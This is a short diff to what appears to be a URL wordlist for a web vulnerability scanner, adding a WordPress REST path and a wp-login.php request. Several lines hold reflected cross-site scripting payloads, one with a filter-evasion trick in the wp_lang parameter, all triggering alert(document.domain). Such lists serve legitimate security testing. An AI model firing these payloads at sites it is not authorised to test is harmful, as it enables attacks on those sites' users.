@@ -209,3 +209,5 @@
 /index.php?rest_route=/wp/v2/pages&per_page=100
 /?page_id={{search_page_id}}&type=tf_hotel&place=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&adults=2&children=1&room=1
 /?PagePrincipale/upload&file=%22%3E%3Csvg/onload=alert(document.domain)%3E
+/wp-json/wp/v2/pages?per_page=100
+/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c
